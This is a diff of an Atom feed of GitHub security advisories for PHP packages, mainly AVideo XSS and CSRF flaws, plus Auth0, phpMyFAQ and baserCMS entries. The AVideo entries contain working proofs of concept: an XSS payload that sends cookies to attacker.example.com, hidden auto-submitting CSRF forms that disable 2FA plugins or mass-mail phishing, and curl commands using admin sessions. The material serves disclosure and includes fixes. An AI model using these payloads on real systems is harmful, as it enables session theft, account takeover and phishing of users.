@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/composer.rss</id>
     <title>Security Advisory for PHP packages hosted at packagist.org</title>
-    <updated>2026-04-01T20:03:15.223Z</updated>
+    <updated>2026-04-01T20:57:19.889Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Acomposer"/>
     <subtitle>Security Advisory for PHP packages hosted at packagist.org on GitHub</subtitle>
@@ -11,6 +11,391 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[wwbn/avideo] AVideo: DOM XSS via Unsanitized Display Name in WebSocket Call Notification]]></title>
+        <id>https://github.com/advisories/GHSA-w4hp-w536-jg64</id>
+        <link href="https://github.com/advisories/GHSA-w4hp-w536-jg64"/>
+        <updated>2026-04-01T20:54:52.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>The AVideo YPTSocket plugin's caller feature renders incoming call notifications using the jQuery Toast Plugin, passing the caller's display name directly as the <code>heading</code> parameter. The toast plugin constructs the heading as raw HTML (<code>'&lt;h2&gt;' + heading + '&lt;/h2&gt;'</code>) and inserts it into the DOM via jQuery's <code>.html()</code> method, which parses and executes any embedded HTML or script content. An attacker can set their display name to an XSS payload and trigger code execution on any online user's browser simply by initiating a call - no victim interaction is required beyond being connected to the WebSocket.</p>
+<h2 id="details">Details</h2>
+<p>When a call notification arrives via WebSocket, the caller's identity is extracted from the JSON message:</p>
+<pre><code class="language-javascript">// plugin/YPTSocket/caller.js:73
+userIdentification = json.from_identification;
+</code></pre>
+<p>This value is passed directly to the jQuery Toast Plugin as the heading:</p>
+<pre><code class="language-javascript">// plugin/YPTSocket/caller.js:89
+heading: userIdentification,
+</code></pre>
+<p>Inside the jQuery Toast Plugin, the heading is rendered as raw HTML:</p>
+<pre><code class="language-javascript">// node_modules/jquery-toast-plugin/src/jquery.toast.js:60
+// Constructs: '&lt;h2&gt;' + heading + '&lt;/h2&gt;'
+// Then inserts via .html()
+</code></pre>
+<p>jQuery's <code>.html()</code> method parses the string as HTML and executes any script-bearing elements (such as <code>&lt;img onerror&gt;</code>, <code>&lt;svg onload&gt;</code>, etc.).</p>
+<p>There is a secondary injection vector in the same file where the full JSON message is placed inside a single-quoted <code>onclick</code> attribute:</p>
+<pre><code class="language-javascript">// plugin/YPTSocket/caller.js:121-123
+imageAndButton += '&lt;button class="btn btn-danger btn-circle incomeCallBtn" onclick=\'hangUpCall(' + JSON.stringify(json) + ')\'&gt;&lt;i class="fas fa-phone-slash"&gt;&lt;/i&gt;&lt;/button&gt;';
+if (isJsonReceivingCall(json)) {
+    imageAndButton += '&lt;button class="btn btn-success btn-circle incomeCallBtn" onclick=\'acceptCall(' + JSON.stringify(json) + ')\'&gt;&lt;i class="fas fa-phone"&gt;&lt;/i&gt;&lt;/button&gt;';
+</code></pre>
+<p><code>JSON.stringify(json)</code> is placed inside a single-quoted <code>onclick</code> attribute. If any field in <code>json</code> contains a single quote, it breaks the attribute boundary and allows attribute injection.</p>
+<h2 id="proof-of-concept">Proof of Concept</h2>
+<p><strong>Important note on the attack vector:</strong> <code>User::setName()</code> at <code>objects/user.php:2069</code> uses <code>strip_tags()</code>, so the display name IS sanitized on the server side when set through the normal UI or API. However, the WebSocket server relays call messages as-is without server-side validation of the <code>from_identification</code> field. A malicious WebSocket client can send any <code>from_identification</code> value directly over the WebSocket protocol, bypassing the server-side sanitization entirely. The attack requires a custom WebSocket client, not the normal UI.</p>
+<p><strong>Step 1: Connect a malicious WebSocket client and send a forged call message</strong></p>
+<p>The following JavaScript connects directly to the AVideo WebSocket server and sends a call message with an XSS payload in the <code>from_identification</code> field:</p>
+<pre><code class="language-javascript">// Malicious WebSocket client - bypasses server-side strip_tags() sanitization
+const ws = new WebSocket('wss://your-avideo-instance.com:8888');
+
+ws.onopen = function() {
+    // Send a forged call message with HTML in from_identification
+    const payload = {
+        msg: 'call',
+        from_users_id: 1,
+        to_users_id: VICTIM_USER_ID,
+        from_identification: '&lt;img src=x onerror=alert(document.cookie)&gt;',
+        resourceURL: 'https://your-avideo-instance.com/meet/123'
+    };
+    ws.send(JSON.stringify(payload));
+    console.log('Forged call message sent');
+};
+</code></pre>
+<p><strong>Step 2:</strong> When the victim receives the call notification, the toast renders <code>from_identification</code> as HTML via jQuery's <code>.html()</code>. The <code>&lt;img&gt;</code> tag triggers the <code>onerror</code> handler, executing JavaScript in the victim's browser context.</p>
+<p>More advanced payload for credential exfiltration:</p>
+<pre><code class="language-javascript">// Credential exfiltration via forged WebSocket call
+const ws = new WebSocket('wss://your-avideo-instance.com:8888');
+ws.onopen = function() {
+    ws.send(JSON.stringify({
+        msg: 'call',
+        from_users_id: 1,
+        to_users_id: VICTIM_USER_ID,
+        from_identification: '&lt;img src=x onerror="fetch(\'https://attacker.example.com/log?\'+document.cookie)"&gt;',
+        resourceURL: 'https://your-avideo-instance.com/meet/123'
+    }));
+};
+</code></pre>
+<p>Reproduction steps:</p>
+<ol>
+<li>Identify the WebSocket server address for the target AVideo instance (typically port 8888).</li>
+<li>Connect a custom WebSocket client to the server.</li>
+<li>Send a call message with <code>from_identification</code> set to <code>&lt;img src=x onerror=alert(document.cookie)&gt;</code>.</li>
+<li>Ensure a victim user is online and connected to the WebSocket (any authenticated page with YPTSocket loaded).</li>
+<li>Observe the XSS payload executing in the victim's browser when the toast notification appears. No victim interaction is required.</li>
+</ol>
+<h2 id="impact">Impact</h2>
+<p>This is a zero-click stored XSS vulnerability. The victim does not need to click anything - merely being connected to the WebSocket (which happens automatically on any authenticated page load) is sufficient for the attack to succeed. The attacker controls when the payload fires by initiating a call.</p>
+<p>Consequences include:</p>
+<ul>
+<li><strong>Session hijacking</strong>: Steal the victim's session cookie and impersonate them.</li>
+<li><strong>Account takeover</strong>: If the victim is an administrator, the attacker gains full platform control.</li>
+<li><strong>Worm propagation</strong>: The XSS payload can automatically change the victim's display name to the same payload and call other online users, creating a self-propagating worm.</li>
+<li><strong>Keylogging and credential theft</strong>: Inject persistent scripts that capture keystrokes on the current page.</li>
+</ul>
+<p>The attack is zero-click and can target any specific online user.</p>
+<ul>
+<li><strong>CWE</strong>: CWE-79 (Cross-Site Scripting - DOM-based)</li>
+</ul>
+<h2 id="recommended-fix">Recommended Fix</h2>
+<p>HTML-escape the heading value before passing it to <code>$.toast()</code> at <code>plugin/YPTSocket/caller.js:89</code>:</p>
+<pre><code class="language-javascript">heading: $('&lt;span&gt;').text(userIdentification).html(),
+</code></pre>
+<p>This uses jQuery's <code>.text()</code> to safely encode the user-controlled string, then extracts the escaped HTML via <code>.html()</code>.</p>
+<hr>
+<p><em>Found by <a href="https://aisafe.io">aisafe.io</a></em></p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/WWBN/AVideo/security/advisories/GHSA-w4hp-w536-jg64">https://github.com/WWBN/AVideo/security/advisories/GHSA-w4hp-w536-jg64</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-34716">https://nvd.nist.gov/vuln/detail/CVE-2026-34716</a></li>
+<li><a href="https://github.com/advisories/GHSA-w4hp-w536-jg64">https://github.com/advisories/GHSA-w4hp-w536-jg64</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-w4hp-w536-jg64</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-04-01T20:54:51.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[wwbn/avideo] AVideo: CSRF on Plugin Enable/Disable Endpoint Allows Disabling Security Plugins]]></title>
+        <id>https://github.com/advisories/GHSA-hqxf-mhfw-rc44</id>
+        <link href="https://github.com/advisories/GHSA-hqxf-mhfw-rc44"/>
+        <updated>2026-04-01T20:54:08.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>The AVideo endpoint <code>objects/pluginSwitch.json.php</code> allows administrators to enable or disable any installed plugin. The endpoint checks for an active admin session but does not validate a CSRF token. Additionally, the <code>plugins</code> database table is explicitly listed in <code>ignoreTableSecurityCheck()</code>, which means the ORM-level Referer/Origin domain validation in <code>ObjectYPT::save()</code> is also bypassed. Combined with <code>SameSite=None</code> on session cookies, an attacker can disable critical security plugins (such as LoginControl for 2FA, subscription enforcement, or access control plugins) by luring an admin to a malicious page.</p>
+<p>Plugin UUIDs are not secret values. They are hardcoded in the frontend JavaScript source and are consistent across installations, making it trivial for an attacker to target specific plugins.</p>
+<h2 id="details">Details</h2>
+<p>The <code>objects/pluginSwitch.json.php</code> endpoint checks admin status but performs no CSRF validation:</p>
+<pre><code class="language-php">// objects/pluginSwitch.json.php
+if (!User::isAdmin()) {
+    die('{"error": "Must be admin"}');
+}
+
+$obj = new Plugin(0);
+$obj-&gt;loadFromUUID($_POST['uuid']);
+$obj-&gt;setStatus($_POST['status']);
+$obj-&gt;save();
+</code></pre>
+<p>The <code>plugins</code> table is explicitly excluded from the ORM security check at <code>objects/Object.php:529</code>:</p>
+<pre><code class="language-php">// objects/Object.php:529
+public static function ignoreTableSecurityCheck() {
+    return array(
+        'plugins',
+        // ... other tables
+    );
+}
+</code></pre>
+<p>This means the <code>save()</code> call does not trigger the Referer/Origin domain validation that normally acts as a secondary CSRF defense for other ORM operations.</p>
+<p>Plugin UUIDs are hardcoded in each plugin's <code>getUUID()</code> method and are consistent across all AVideo installations. Examples:</p>
+<table>
+<thead>
+<tr>
+<th>Plugin</th>
+<th>UUID</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Gallery</td>
+<td><code>a06505bf-3570-4b1f-977a-fd0e5cab205d</code></td>
+</tr>
+<tr>
+<td>LoginControl</td>
+<td><code>LoginControl-5ee8405eaaa16</code></td>
+</tr>
+<tr>
+<td>Live</td>
+<td><code>e06b161c-cbd0-4c1d-a484-71018efa2f35</code></td>
+</tr>
+<tr>
+<td>YPTWallet</td>
+<td><code>2faf2eeb-88ac-48e1-a098-37e76ae3e9f3</code></td>
+</tr>
+</tbody></table>
+<p>These are also exposed in frontend JavaScript:</p>
+<pre><code class="language-javascript">// design_first_page.php:99
+var galleryUUID = 'a06505bf-3570-4b1f-977a-fd0e5cab205d';
+</code></pre>
+<h2 id="proof-of-concept">Proof of Concept</h2>
+<p>Host the following HTML page on an attacker-controlled domain. This example disables the LoginControl plugin (which provides 2FA and login security enforcement):</p>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;AVI-031 PoC - Disable Security Plugin&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;h1&gt;Loading content...&lt;/h1&gt;
+
+&lt;!-- Disable LoginControl (2FA / brute force protection) --&gt;
+&lt;iframe name="f1" style="display:none"&gt;&lt;/iframe&gt;
+&lt;form id="disable1" method="POST" target="f1"
+      action="https://your-avideo-instance.com/objects/pluginSwitch.json.php"&gt;
+  &lt;input type="hidden" name="uuid" value="LoginControl-5ee8405eaaa16" /&gt;
+  &lt;input type="hidden" name="status" value="inactive" /&gt;
+&lt;/form&gt;
+
+&lt;!-- Disable YPTWallet (subscription/payment enforcement) --&gt;
+&lt;iframe name="f2" style="display:none"&gt;&lt;/iframe&gt;
+&lt;form id="disable2" method="POST" target="f2"
+      action="https://your-avideo-instance.com/objects/pluginSwitch.json.php"&gt;
+  &lt;input type="hidden" name="uuid" value="2faf2eeb-88ac-48e1-a098-37e76ae3e9f3" /&gt;
+  &lt;input type="hidden" name="status" value="inactive" /&gt;
+&lt;/form&gt;
+
+&lt;script&gt;
+  document.getElementById('disable1').submit();
+  document.getElementById('disable2').submit();
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p><strong>To find plugin UUIDs on a target instance:</strong></p>
+<pre><code class="language-bash"># UUIDs are exposed in the frontend source
+curl -s "https://your-avideo-instance.com/" | grep -oP '[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}'
+</code></pre>
+<p><strong>Verification with curl:</strong></p>
+<pre><code class="language-bash"># Disable a plugin using an admin session
+curl -b "PHPSESSID=ADMIN_SESSION_COOKIE" \
+  -X POST "https://your-avideo-instance.com/objects/pluginSwitch.json.php" \
+  -d "uuid=a06505bf-3570-4b1f-977a-fd0e5cab205d&amp;status=inactive"
+
+# Verify the plugin is now inactive
+curl -b "PHPSESSID=ADMIN_SESSION_COOKIE" \
+  "https://your-avideo-instance.com/admin/index.php" | grep -A2 "Gallery"
+</code></pre>
+<h2 id="impact">Impact</h2>
+<p>An attacker can silently disable any AVideo plugin by luring an authenticated admin to a malicious web page. This has significant security implications because AVideo relies on plugins for critical security functions:</p>
+<ul>
+<li><strong>LoginControl</strong>: Provides two-factor authentication and brute force protection. Disabling it removes 2FA for all users and allows unlimited login attempts.</li>
+<li><strong>Subscription/PayPal/Stripe plugins</strong>: Enforce payment requirements for premium content. Disabling them grants free access to paid videos.</li>
+<li><strong>Access control plugins</strong>: Restrict content visibility. Disabling them exposes private or restricted videos.</li>
+</ul>
+<p>The attack is silent (no visible indication to the admin), the plugin UUIDs are public constants, and the <code>SameSite=None</code> cookie policy ensures cross-origin delivery of the admin session.</p>
+<ul>
+<li><strong>CWE-352</strong>: Cross-Site Request Forgery</li>
+</ul>
+<h2 id="recommended-fix">Recommended Fix</h2>
+<p>Add CSRF token validation at <code>objects/pluginSwitch.json.php:11</code>, after the admin check:</p>
+<pre><code class="language-php">// objects/pluginSwitch.json.php:11
+if (!isGlobalTokenValid()) {
+    forbiddenPage('Invalid CSRF token');
+}
+</code></pre>
+<hr>
+<p><em>Found by <a href="https://aisafe.io">aisafe.io</a></em></p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/WWBN/AVideo/security/advisories/GHSA-hqxf-mhfw-rc44">https://github.com/WWBN/AVideo/security/advisories/GHSA-hqxf-mhfw-rc44</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-34613">https://nvd.nist.gov/vuln/detail/CVE-2026-34613</a></li>
+<li><a href="https://github.com/WWBN/AVideo/commit/7ddfe4ec270d720e11f5dc28db73dfcd2cf9192a">https://github.com/WWBN/AVideo/commit/7ddfe4ec270d720e11f5dc28db73dfcd2cf9192a</a></li>
+<li><a href="https://github.com/WWBN/AVideo/commit/da375103d59118d1c1b1801ac7fce3cd426f8736">https://github.com/WWBN/AVideo/commit/da375103d59118d1c1b1801ac7fce3cd426f8736</a></li>
+<li><a href="https://github.com/advisories/GHSA-hqxf-mhfw-rc44">https://github.com/advisories/GHSA-hqxf-mhfw-rc44</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-hqxf-mhfw-rc44</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-04-01T20:54:07.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[wwbn/avideo] AVideo: CSRF on emailAllUsers.json.php Enables Mass Phishing Email to All Users]]></title>
+        <id>https://github.com/advisories/GHSA-c4xj-x7p8-3x7q</id>
+        <link href="https://github.com/advisories/GHSA-c4xj-x7p8-3x7q"/>
+        <updated>2026-04-01T20:48:55.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>The AVideo endpoint <code>objects/emailAllUsers.json.php</code> allows administrators to send HTML emails to every registered user on the platform. While the endpoint verifies admin session status, it does not validate a CSRF token. Because AVideo sets <code>SameSite=None</code> on session cookies, a cross-origin POST request from an attacker-controlled page will include the admin's session cookie automatically. An attacker who lures an admin to a malicious page can send an arbitrary HTML email to every user on the platform, appearing to originate from the instance's legitimate SMTP address.</p>
+<p>The endpoint does not call <code>save()</code> on any ORM object, which means the Referer/Origin domain validation implemented in <code>ObjectYPT::save()</code> is never triggered, leaving CSRF as the only required protection - and it is absent.</p>
+<h2 id="details">Details</h2>
+<p>The endpoint performs an admin check at line 10 but has no CSRF token validation:</p>
+<pre><code class="language-php">// objects/emailAllUsers.json.php:10
+if (!User::isAdmin()) {
+    die('{"error": "Must be admin"}');
+}
+</code></pre>
+<p>The message body is taken directly from POST data at line 41:</p>
+<pre><code class="language-php">// objects/emailAllUsers.json.php:41
+$obj-&gt;message = $_POST['message'];
+</code></pre>
+<p>The message is rendered as HTML in the email at line 48:</p>
+<pre><code class="language-php">// objects/emailAllUsers.json.php:48
+$mail-&gt;msgHTML($obj-&gt;message);
+</code></pre>
+<p>When the <code>email</code> POST parameter is omitted, the endpoint defaults to sending to all registered users by calling <code>User::getAllUsers()</code>. This means the attacker does not need to know any email addresses.</p>
+<p>The emails are sent through the platform's configured SMTP server, so they originate from the legitimate platform email address and pass SPF/DKIM validation. This makes the phishing emails highly convincing.</p>
+<h2 id="proof-of-concept">Proof of Concept</h2>
+<p>Host the following HTML on an attacker-controlled domain and lure an AVideo administrator to visit it:</p>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;AVI-038 PoC - CSRF Mass Email&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;h1&gt;Please wait...&lt;/h1&gt;
+&lt;form id="massmail" method="POST"
+      action="https://your-avideo-instance.com/objects/emailAllUsers.json.php"&gt;
+
+  &lt;input type="hidden" name="subject" value="Important: Verify Your Account" /&gt;
+
+  &lt;textarea name="message" style="display:none"&gt;
+    &lt;h2&gt;Account Verification Required&lt;/h2&gt;
+    &lt;p&gt;Your account requires re-verification due to a recent security update.&lt;/p&gt;
+    &lt;p&gt;Please &lt;a href="https://attacker.example.com/phish"&gt;click here to verify&lt;/a&gt;
+       within 24 hours to avoid account suspension.&lt;/p&gt;
+    &lt;p&gt;Thank you,&lt;br/&gt;The Platform Team&lt;/p&gt;
+  &lt;/textarea&gt;
+
+  &lt;!-- Omitting 'email' parameter causes it to send to ALL users --&gt;
+&lt;/form&gt;
+
+&lt;script&gt;document.getElementById('massmail').submit();&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p><strong>Verification steps:</strong></p>
+<ol>
+<li>Set up a test AVideo instance with at least two registered user accounts.</li>
+<li>Log in as an admin in one browser tab.</li>
+<li>Open the attacker HTML page in another tab in the same browser.</li>
+<li>Check the email inboxes of all registered users. Each will have received the phishing email from the platform's legitimate SMTP address.</li>
+</ol>
+<p>Alternatively, test with curl using an admin session cookie:</p>
+<pre><code class="language-bash">curl -b "PHPSESSID=ADMIN_SESSION_COOKIE" \
+  -X POST "https://your-avideo-instance.com/objects/emailAllUsers.json.php" \
+  -d "subject=Test&amp;message=&lt;h1&gt;PoC&lt;/h1&gt;&lt;p&gt;This email was sent to all users.&lt;/p&gt;"
+</code></pre>
+<h2 id="impact">Impact</h2>
+<p>An attacker can send attacker-controlled HTML emails to every registered user on an AVideo platform by exploiting the admin's session via CSRF. The emails originate from the platform's legitimate SMTP address, pass email authentication checks (SPF, DKIM, DMARC), and appear indistinguishable from genuine platform communications. This enables:</p>
+<ul>
+<li>Mass phishing campaigns targeting all platform users with highly credible emails</li>
+<li>Credential harvesting by directing users to attacker-controlled login pages</li>
+<li>Malware distribution via HTML email payloads</li>
+<li>Reputation damage to the platform operator</li>
+</ul>
+<p>The attack requires only a single click from an authenticated admin (visiting an attacker-controlled page). No user enumeration or email address knowledge is needed.</p>
+<ul>
+<li><strong>CWE-352</strong>: Cross-Site Request Forgery</li>
+</ul>
+<h2 id="recommended-fix">Recommended Fix</h2>
+<p>Add CSRF token validation at <code>objects/emailAllUsers.json.php:13</code>, after the admin check:</p>
+<pre><code class="language-php">// objects/emailAllUsers.json.php:13
+if (!isGlobalTokenValid()) {
+    forbiddenPage('Invalid CSRF token');
+    exit;
+}
+</code></pre>
+<hr>
+<p><em>Found by <a href="https://aisafe.io">aisafe.io</a></em></p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/WWBN/AVideo/security/advisories/GHSA-c4xj-x7p8-3x7q">https://github.com/WWBN/AVideo/security/advisories/GHSA-c4xj-x7p8-3x7q</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-34611">https://nvd.nist.gov/vuln/detail/CVE-2026-34611</a></li>
+<li><a href="https://github.com/WWBN/AVideo/commit/226ad24a51edac57e079ac92ca95c82e1e23e3cf">https://github.com/WWBN/AVideo/commit/226ad24a51edac57e079ac92ca95c82e1e23e3cf</a></li>
+<li><a href="https://github.com/advisories/GHSA-c4xj-x7p8-3x7q">https://github.com/advisories/GHSA-c4xj-x7p8-3x7q</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-c4xj-x7p8-3x7q</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-04-01T20:48:53.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[auth0/auth0-php] Auth0 PHP SDK has Insufficient Entropy in Cookie Encryption]]></title>
+        <id>https://github.com/advisories/GHSA-w3wc-44p4-m4j7</id>
+        <link href="https://github.com/advisories/GHSA-w3wc-44p4-m4j7"/>
+        <updated>2026-04-01T20:29:44.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>In applications built with the Auth0 PHP SDK, cookies are encrypted with insufficient entropy, which may result in threat actors brute-forcing the encryption key and forging session cookies.</p>
+<h3 id="am-i-affected">Am I Affected?</h3>
+<p>Consumers are affected if their application meets the following preconditions:</p>
+<ul>
+<li>Their application is using the Auth0-PHP SDK, versions between 8.0.0 and 8.18.0</li>
+<li>Their application is using the Auth0-PHP SDK, or the following SDKs that rely on the Auth0-PHP SDK:<ul>
+<li>Auth0/symfony,</li>
+<li>Auth0/laravel0-auth0, or</li>
+<li>Auth0/wordpress</li>
+</ul>
+</li>
+</ul>
+<h3 id="resolution">Resolution</h3>
+<p>Upgrade Auth0/Auth0-PHP to version 8.19.0 or greater.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/auth0/auth0-PHP/security/advisories/GHSA-w3wc-44p4-m4j7">https://github.com/auth0/auth0-PHP/security/advisories/GHSA-w3wc-44p4-m4j7</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-34236">https://nvd.nist.gov/vuln/detail/CVE-2026-34236</a></li>
+<li><a href="https://github.com/auth0/auth0-PHP/releases/tag/8.19.0">https://github.com/auth0/auth0-PHP/releases/tag/8.19.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-w3wc-44p4-m4j7">https://github.com/advisories/GHSA-w3wc-44p4-m4j7</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-w3wc-44p4-m4j7</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-04-01T20:29:26.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[devcode-it/openstamanager] OpenSTAManager Affected by Remote Code Execution via Insecure Deserialization in OAuth2]]></title>
         <id>https://github.com/advisories/GHSA-whv5-4q2f-q68g</id>
@@ -1759,254 +2144,5 @@ If it does not appear, you can also access it directly via:
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2026-03-31T22:48:45.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[thorsten/phpmyfaq] phpMyFAQ is Vulnerable to Stored XSS via Unsanitized Email Field in Admin FAQ Editor]]></title>
-        <id>https://github.com/advisories/GHSA-98gw-w575-h2ph</id>
-        <link href="https://github.com/advisories/GHSA-98gw-w575-h2ph"/>
-        <updated>2026-03-31T22:48:47.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>An unauthenticated attacker can submit a guest FAQ with an email address that is syntactically valid per RFC 5321 (quoted local part) yet contains raw HTML — for example ""@evil.com. PHP's FILTER_VALIDATE_EMAIL accepts this email as valid. The email is stored in the database without HTML sanitization and later rendered in the admin FAQ editor template using Twig's |raw filter, which bypasses auto-escaping entirely.</p>
-<h3 id="details">Details</h3>
-<ol>
-<li>PHP FILTER_VALIDATE_EMAIL accepts RFC-valid quoted local parts with dangerous characters</li>
-</ol>
-<p>phpmyfaq/src/phpMyFAQ/Controller/Frontend/Api/FaqController.php:99
-$email = trim((string) Filter::filterVar($data-&gt;email, FILTER_VALIDATE_EMAIL));
-PHP accepts ""@evil.com as a valid email (RFC 5321 allows &lt;, &gt; inside quoted local parts). Confirmed:
-""@evil.com =&gt; string (valid, not false)</p>
-<ol start="2">
-<li>Email stored raw without HTML sanitization</li>
-</ol>
-<p>phpmyfaq/src/phpMyFAQ/Faq.php — email retrieved directly as $row-&gt;email from the database.</p>
-<ol start="3">
-<li>Admin Twig template renders email with |raw</li>
-</ol>
-<p>phpmyfaq/assets/templates/admin/content/faq.editor.twig:296
-<input class="form-control" value="{{ faqData['email'] | raw }}" id="email" name="email" type="email"></p>
-<p>Affected version: 4.2.0-alpha, commit f0dc86c8f</p>
-<h3 id="poc">PoC</h3>
-<p><strong>The reproduction of the vulnerability was implemented with the help of AI while reviewing the source code to generate the proof-of-concept. Please kindly note this for reference. Since the vulnerability has already been confirmed directly in the source code, the proof-of-concept code may be considered as a reference only.</strong></p>
-<p>Please extract the attached compressed file and proceed.
-<a href="https://github.com/user-attachments/files/25938058/poc.zip">poc.zip</a></p>
-<ol start="0">
-<li>(docker compose -f docker-compose.yml down -v)</li>
-<li>docker compose -f docker-compose.yml up -d mariadb php-fpm nginx</li>
-<li>bash exploit.sh</li>
-</ol>
-<hr>
-<ol>
-<li>Access <a href="http://localhost:8888/admin/">http://localhost:8888/admin/</a></li>
-<li>Log in with admin / Admin1234!</li>
-<li>After logging in, check whether the URL remains <a href="http://localhost:8888/admin/">http://localhost:8888/admin/</a></li>
-<li>Go to Content → FAQ Administration → edit "poc" → alert popup should appear
-If it does not appear, you can also access it directly via:
-<a href="http://localhost:8888/admin/faq/edit/1/en">http://localhost:8888/admin/faq/edit/1/en</a></li>
-</ol>
-<img src="https://github.com/user-attachments/assets/b6d5446f-4eba-4cb2-9284-1bca4855142e" alt="스크린샷 2026-03-12 오후 11 42 52" height="239" width="1388">
-<img src="https://github.com/user-attachments/assets/3578e429-7106-4616-92ed-4167816d40f0" alt="스크린샷 2026-03-12 오후 11 16 17" height="92" width="1171">
-
-
-<h3 id="impact">Impact</h3>
-<p>When an administrator opens /admin/faq/edit/{id}/{lang} to review the pending FAQ, the injected script executes in the admin's browser context. This allows an attacker to:</p>
-<ul>
-<li>Steal the administrator's session cookie → full admin account takeover</li>
-<li>Perform arbitrary admin actions (create users, modify content, change configuration)</li>
-<li>Pivot to further attacks on the server</li>
-</ul>
-<p>The attack chain requires no authentication. By default, records.allowNewFaqsForGuests=true allows unauthenticated FAQ submission, and records.defaultActivation=false guarantees the administrator must visit the edit page to review it.</p>
-<p>Note on captcha: The built-in captcha is enabled by default when the PHP gd extension is present (spam.enableCaptchaCode=true). This prevents fully automated exploitation but does not prevent a targeted manual attack — an attacker can solve the captcha once and submit the payload. </p>
-<h3 id="credits">Credits</h3>
-<p>wooseokdotkim</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/thorsten/phpMyFAQ/security/advisories/GHSA-98gw-w575-h2ph">https://github.com/thorsten/phpMyFAQ/security/advisories/GHSA-98gw-w575-h2ph</a></li>
-<li><a href="https://github.com/advisories/GHSA-98gw-w575-h2ph">https://github.com/advisories/GHSA-98gw-w575-h2ph</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-98gw-w575-h2ph</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-03-31T22:48:45.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[baserproject/basercms] baserCMS Path Traversal Leads to Arbitrary File Write and RCE via Theme File API]]></title>
-        <id>https://github.com/advisories/GHSA-c5c6-37vq-pjcq</id>
-        <link href="https://github.com/advisories/GHSA-c5c6-37vq-pjcq"/>
-        <updated>2026-03-31T22:47:39.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>A path traversal vulnerability exists in the baserCMS 5.x theme file management API (<code>/baser/api/admin/bc-theme-file/theme_files/add.json</code>) that allows arbitrary file write.</p>
-<p>An authenticated administrator can include <code>../</code> sequences in the <code>path</code> parameter to create a PHP file in an arbitrary directory outside the theme directory, which may result in remote code execution (RCE).</p>
-<h2 id="affected-code">Affected Code</h2>
-<p><strong>File</strong>: <code>plugins/bc-theme-file/src/Service/BcThemeFileService.php</code></p>
-<pre><code class="language-php">public function getFullpath(string $theme, string $plugin, string $type, string $path)
-{
-    // ...
-    return $viewPath . $type . DS . $path;  // $path is not sanitized
-}
-</code></pre>
-<h2 id="attack-scenario">Attack Scenario</h2>
-<ol>
-<li>The attacker compromises an administrator account (password leak, brute force, etc.)</li>
-<li>Obtains an access token via API login</li>
-<li>Specifies <code>path: "../../../../webroot/"</code> in the theme file creation API</li>
-<li>A PHP file is created in the webroot</li>
-<li>The attacker accesses the created PHP file to achieve RCE</li>
-</ol>
-<h2 id="reproduction-steps">Reproduction Steps</h2>
-<pre><code class="language-bash"># 1. Login
-curl -X POST "http://target/baser/api/admin/baser-core/users/login.json" \
-  -H "Content-Type: application/json" \
-  -d '{"email":"admin@example.com","password":"password"}'
-
